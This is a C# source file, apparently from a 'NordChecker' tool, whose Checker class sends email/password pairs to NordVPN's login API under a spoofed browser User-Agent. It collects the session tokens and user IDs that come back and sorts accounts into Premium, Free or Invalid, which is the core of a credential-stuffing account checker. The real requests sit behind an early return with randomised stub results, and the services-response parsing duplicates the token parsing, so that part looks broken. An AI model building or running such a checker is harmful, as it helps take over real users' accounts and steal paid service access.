using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;

namespace NordChecker.Models
{
    internal class Checker
    {
        public void ProcessAccount(ref bool isAborted, object boxedAccount)
        {
            Account account = (Account)boxedAccount;
            if (isAborted) return;

            //Thread.Sleep(2000);
            Thread.Sleep(new Random().Next(1000, 5000));
            //account.State = AccountState.Free;
            account.State = new Random().Next(10) == 0 ? AccountState.Premium
                : new Random().Next(2) == 0 ? AccountState.Invalid
                : AccountState.Free;
            return;

            var content = new FormUrlEncodedContent(new Dictionary<string, string>{
                { "username", account.Email },
                { "password", account.Password }
            });

            if (isAborted)
            {
                account.State = AccountState.Invalid;
                return;
            }

            HttpClient client = new HttpClient();
            client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36");
            client.DefaultRequestHeaders.Add("Accept", "*/*");

            string response;
            client.PostAsync("https://api.nordvpn.com/v1/users/tokens", content)
                .ContinueWith(async t => response = await t.Result.Content.ReadAsStringAsync())
                .Wait();

            if (isAborted)
            {
                account.State = AccountState.Invalid;
                return;
            }

            try
            {
                JToken root = JArray.Parse(response).First;
                account.Token = root.Value<string>("token");
                account.RenewToken = root.Value<string>("renew_token");
                account.UserId = root.Value<int>("user_id");
                account.ExpiresAt = root.Value<DateTime>("expires_at");
            }
            catch
            {
                account.State = AccountState.Invalid;
                return;
            }

            if (isAborted)
            {
                account.State = AccountState.Invalid;
                return;
            }

            string authString = Utils.Base64Encode("token:" + account.Token);
            client.DefaultRequestHeaders.Add("Authorization", "Basic " + authString);
            client.GetAsync("https://api.nordvpn.com/v1/users/services")
                .ContinueWith(async t => response = await t.Result.Content.ReadAsStringAsync())
                .Wait();

            if (isAborted)
            {
                account.State = AccountState.Invalid;
                return;
            }

            try
            {
                JToken root = JArray.Parse(response).First;
                account.Token = root.Value<string>("token");
                account.RenewToken = root.Value<string>("renew_token");
                account.UserId = root.Value<int>("user_id");
                account.ExpiresAt = root.Value<DateTime>("expires_at");
            }
            catch
            {
                account.State = AccountState.Invalid;
                return;
            }

            Console.WriteLine(response);

            account.State = AccountState.Premium;
            return;
        }
    }
}
